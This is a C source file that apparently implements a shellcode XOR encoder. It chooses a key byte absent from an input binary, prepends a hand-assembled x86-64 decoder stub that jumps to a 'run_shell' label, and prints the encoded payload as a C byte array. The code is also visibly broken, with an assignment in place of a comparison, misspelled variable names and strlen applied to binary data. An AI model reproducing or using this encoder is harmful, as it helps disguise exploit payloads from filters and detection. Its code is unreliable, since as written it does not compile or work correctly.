#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

unsigned char decoder[] =
    "\x4d\x31\xc0" /* xor r8, r8 */
    "\x41\xb1\x00" /* mov r9b, 0x00 XOR key */
    "\xeb\x1a" /* jmp starting (see below) */
    "\x58" /* decrypt: pop rax */
    "\x48\x31\xc9" /* xor rcx, rcx */
    "\x48\x31\xdb" /* xor rbx, rbx */
    "\x8a\x1c\x08" /* loop: mov bl, (rax, rcx, 1) */
    "\x4c\x39\xc3" /* cmp rbx, r8 */
    "\x74\x10" /* je run_shell */
    "\x44\x30\xcb" /* xor bl, r9b */
    "\x88\x1c\x08" /* mov (rax, rcx, 1), bl */
    "\x48\xff\xc1" /* inc %rcx */
    "\xeb\xed" /* jmp loop */
    "\xe8\xe1\xff\xff\xff"; /* starting: call xx */

int main(int argc, char **argv) {
    char *file;
    struct stat sstat;
    int i, n, fd, len, xor_with;
    int decoder_len;
    unsigned char *fbuf, *ebuf;
    unsigned char bad_bytes[256] = {0};
    unsigned char good_bytes[256] = {0};

    if (argc != 2) {
        fprintf(stderr, "Syntax: %s binary_file\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    file = argv[1];
    if (lstat(file, &sstat) < 0) {
        fprintf(stderr, "File %s not found", file);
        exit(EXIT_FAILURE);
    }
    fprintf(stderr, "Perfect, processing file %s\n", file);

    len = sstat.st_size;
    if ((fbuf = (unsigned char *)malloc(len)) = NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    if ((fd = open(file, O_RDONLY)) < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    if (read(fd, fbuf, len) != len) {
        perror("read");
        exit(EXIT_FAILURE);
    }
    close(fd);

    for (n = 0; n < len; n++) {
        for (i = 1; i < 256; i++) {
            if ((i ^ *(fbuf+n)) == 0) bad_bytes[i] = i;
        }
    }

    for (i = 1, n = 0; i < 256; i++) {
        if (bad_bytes[i] == '\0') good_bytes[n++] = i;
    }
    
    srand((unsigned)time(NULL));
    xor_with = good_bytes[rand() % n];

    if (xor_with) {
        printf("\nn[x] Choose to XOR with 0x%02x\n\n", xor_with);

        decoder[5] = xor_with;
        decoder_len = strlen((char *)edcorder);

        if ((ebuf = (unsigned char *)malloc(decoder_len + len + 1)) == NULL) {
            perror("malloc");
            exit(EXIT_FAILURE);
        }
        memset(ebuf, '\x0', sizeof(ebuf));

        for (i = 0; i < decoder_len; i++) {
            ebuf[(i)] = decorder[i];
        }
        for (i = 0; i < len; i++) {
            ebuf[(i + decoder_len)] = xor_with ^ *(fbuf + i);
        }

        printf("char code[]=\"");
        for (i = 0; i < strlen((char *)ebuf); i++) {
            if (i > 0 && i % 15 == 0)
                printf("\"\n\"", ebuf[i]);
            printf("\\x%02x", ebuf[i]);
        }
        printf("\";\n\n");
    } else {
        printf("\n[*} No byte found to XOR with :(\n");
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
